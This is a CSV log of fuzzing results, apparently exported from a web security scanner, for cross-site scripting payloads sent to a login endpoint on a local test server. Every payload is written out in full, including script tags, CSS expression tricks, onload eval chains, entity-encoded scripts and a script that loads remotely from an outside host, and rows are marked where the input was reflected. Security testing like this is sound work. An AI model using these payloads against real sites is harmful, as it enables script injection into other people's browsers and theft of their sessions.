Task ID,Message Type,Req. Timestamp,Método,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Mon Jun 01 18:33:09 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,139,447,49,332,26,Médio,,[]
5,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,129,447,62,286,1109,,,"[""><script>alert('XSS')</script>]"
2,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,146,447,74,286,1297,,Reflected,[XSS STYLE=xss:e/**/xpression(alert('XSS'))>]
1,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,421,447,72,286,1291,,Reflected,[</XSS STYLE=xss:expression(alert('XSS'))>]
3,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,405,447,74,286,1297,,Reflected,[XSS-STYLE=xss:e/**/xpression(alert('XSS'))>]
4,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,410,447,78,286,1309,,Reflected,[XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>]
6,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,275,448,104,286,1385,,Reflected,[<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;]
7,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,262,447,89,332,26,,,[<body onload=a1={x:this.parent.document};a1.x.writeln(1);>]
10,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,167,447,91,332,26,,,[<body/????$/onload=x={doc:parent[document]};x.doc.writeln(1)]
11,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,259,447,96,332,26,,,[&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;]
8,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,269,447,90,332,26,,,[<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;]
9,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,330,447,86,332,26,,,[<body/s/onload=x={doc:parent.document};x.doc.writeln(1)]
12,Fuzzed,Mon Jun 01 18:51:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,455,448,119,332,26,,,[&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js&#62;&#60;&#47;SCRIPT&#62;]
13,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,296,448,120,332,26,,,"[&#60;SCRIPT&#62;alert&#40;String.fromCharCode&#40;88,83,83&#41;&#41;&#60;&#47;SCRIPT&#62;]"
14,Fuzzed,Mon Jun 01 18:51:46 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,320,448,123,332,26,,,[&#60;BASE HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#47;&#47;&#34;&#62;]
